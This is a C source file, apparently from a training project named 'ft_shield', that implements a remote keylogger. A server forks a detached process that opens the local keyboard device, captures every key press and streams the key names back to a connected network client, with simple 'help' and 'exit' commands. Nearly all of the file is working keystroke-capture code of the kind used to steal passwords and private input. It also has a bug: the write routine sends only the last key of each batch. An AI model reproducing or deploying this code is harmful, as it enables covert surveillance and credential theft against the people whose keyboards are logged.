#include "ft_shield.h"
#include <linux/input.h>
#include <dirent.h>
#include <ctype.h>
#include <sys/ioctl.h>

char *keycodes[247] = {"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "MINUS", "EQUAL", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL", "A", "S", "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE", "GRAVE", "LEFTSHIFT", "BACKSLASH", "Z", "X", "C", "V", "B", "N", "M", "COMMA", "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "KP7", "KP8", "KP9", "KPMINUS", "KP4", "KP5", "KP6", "KPPLUS", "KP1", "KP2", "KP3", "KP0", "KPDOT", "ZENKAKUHANKAKU", "102ND", "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA", "MUHENKAN", "KPJPCOMMA", "KPENTER", "RIGHTCTRL", "KPSLASH", "SYSRQ", "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END", "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN", "VOLUMEUP", "POWER", "KPEQUAL", "KPPLUSMINUS", "PAUSE", "SCALE", "KPCOMMA", "HANGEUL", "HANGUEL", "HANJA", "YEN", "LEFTMETA", "RIGHTMETA",
                       "COMPOSE", "STOP", "AGAIN", "PROPS", "UNDO", "FRONT", "COPY", "OPEN", "PASTE", "FIND", "CUT", "HELP", "MENU", "CALC", "SETUP", "SLEEP", "WAKEUP", "FILE", "SENDFILE", "DELETEFILE", "XFER", "PROG1", "PROG2", "WWW", "MSDOS", "COFFEE", "SCREENLOCK", "ROTATE_DISPLAY",
                       "DIRECTION", "CYCLEWINDOWS", "MAIL", "BOOKMARKS", "COMPUTER", "BACK", "FORWARD", "CLOSECD", "EJECTCD", "EJECTCLOSECD", "NEXTSONG", "PLAYPAUSE", "PREVIOUSSONG", "STOPCD", "RECORD", "REWIND", "PHONE", "ISO", "CONFIG", "HOMEPAGE", "REFRESH", "EXIT", "MOVE", "EDIT", "SCROLLUP", "SCROLLDOWN", "KPLEFTPAREN", "KPRIGHTPAREN", "NEW", "REDO", "F13", "F14", "F15", "F16", "F17", "F18", "F19", "F20", "F21", "F22", "F23", "F24", "PLAYCD", "PAUSECD", "PROG3", "PROG4", "ALL_APPLICATIONS", "DASHBOARD", "SUSPEND", "CLOSE", "PLAY", "FASTFORWARD", "BASSBOOST", "PRINT", "HP", "CAMERA", "SOUND", "QUESTION", "EMAIL", "CHAT", "SEARCH", "CONNECT", "FINANCE", "SPORT", "SHOP", "ALTERASE", "CANCEL", "BRIGHTNESSDOWN", "BRIGHTNESSUP", "MEDIA", "SWITCHVIDEOMODE", "KBDILLUMTOGGLE", "KBDILLUMDOWN", "KBDILLUMUP", "SEND", "REPLY", "FORWARDMAIL", "SAVE", "DOCUMENTS", "BATTERY", "BLUETOOTH", "WLAN", "UWB", "UNKNOWN", "VIDEO_NEXT", "VIDEO_PREV", "BRIGHTNESS_CYCLE", "BRIGHTNESS_AUTO", "BRIGHTNESS_ZERO", "DISPLAY_OFF", "WWAN", "WIMAX"};
size_t event_size = sizeof(t_event);


#define KLG_HELP "Available commands:\n\
help: print this help\n\
exit: close keylogger\n"

static int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
{
	int written;
	char str[256] = {0};
	for (size_t j = 0; j < to_write / event_size; j++)
		snprintf(str, 255, "Key: %s\n", keycodes[events[j].code]);
	written = write(fd, str, strlen(str));
	if (written < 0)
		return written;
	return 1;
}

void handle_klg_cmd(char *bfr) {
	if (!strncmp("help\n", bfr, strlen(bfr))) {
		printf(KLG_HELP);
	}
	if (!strncmp("exit\n", bfr, strlen(bfr))) {
		exit(0);
	}
}

int	keylogger_function(t_server *server, int index)
{
	const int	client_fd = server->clients[index].fd;
	pid_t		pid;
	int			inpipe_fds[2], outpipe_fds[2];

	ft_dprintf(2, "clientfd: %d\n", client_fd);


	pipe(inpipe_fds);
	pipe(outpipe_fds);
	server->clients[index].inpipe_fd = inpipe_fds[WRITE_END]; //write end for server, we read from 0 here in stdin
	server->clients[index].outpipe_fd = outpipe_fds[READ_END]; //read end for server, we write in 1 here

	pid = fork();
	if (pid < 0) {
		ft_perror("fork");
	}
	else if (pid == 0) {
		setsid();

		close(server->fd);
		close(inpipe_fds[WRITE_END]);
		close(outpipe_fds[READ_END]);
		dup2(inpipe_fds[READ_END], STDIN_FILENO);
		dup2(outpipe_fds[WRITE_END], STDERR_FILENO);
		dup2(outpipe_fds[WRITE_END], STDOUT_FILENO);
		close(inpipe_fds[READ_END]);
		close(outpipe_fds[WRITE_END]);
		close(client_fd);
		int	kb;
		if (!keyboardFound(DEV_PATH, &kb)) {
			printf("couldn't open keyboard :(\n");
			exit(1);
		}

		t_event kbd_events[event_size * MAX_EVENTS];
		fd_set rset;
		
		int maxfd = kb;

		while (1)
		{
			fflush(stdout);
			FD_SET(STDIN_FILENO, &rset);
			FD_SET(kb, &rset);
			struct timeval tv = {.tv_sec = 0, .tv_usec = 5000};
			int retval = select(maxfd + 1, &rset, NULL, NULL, &tv);
			if (retval == -1) { ft_perror("select"); break; }
			if (FD_ISSET(kb, &rset)) {
				int r = read(kb, kbd_events, event_size * MAX_EVENTS);
				if (r < 0)
					break ;
				else
				{
					size_t j = 0;
					for (size_t i = 0; i < r / event_size; i++) //for each event read
					{
						if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) //if a key has been pressed..
							kbd_events[j++] = kbd_events[i];                                    //add the event to the beginning of the array
					}
					if (writeEventsIntoFile(STDOUT_FILENO, kbd_events, j * event_size) < 0)
						break ;
				}
			}
			if (FD_ISSET(STDIN_FILENO, &rset)) {
				char buffer[256];
				int r = read(STDIN_FILENO, buffer, 255);
				if (r <= 0)
					break ;
				buffer[r] = 0;
				handle_klg_cmd(buffer);
			}
		}
		close(STDOUT_FILENO);
		close(kb);
		exit(0);
	}
	else if (pid > 0) {
		ft_lstadd_back(&server->pids, ft_lstnew((void *)(long)pid));
		close(inpipe_fds[READ_END]);
		close(outpipe_fds[WRITE_END]);
	}
	return (1);
}